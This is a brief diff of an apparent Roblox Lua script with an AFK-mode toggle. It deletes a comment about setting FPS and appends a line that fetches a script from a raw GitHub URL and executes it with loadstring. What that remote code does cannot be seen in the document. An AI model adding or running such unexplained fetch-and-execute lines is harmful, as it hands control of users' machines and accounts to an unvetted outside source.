@@ -70,5 +70,4 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
         toggleAFKMode(not afkMode)
     end
 end)
-
--- ✅ Contoh set FPS langsung (opsional)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/onekiki/fishit/refs/heads/main/first"))()
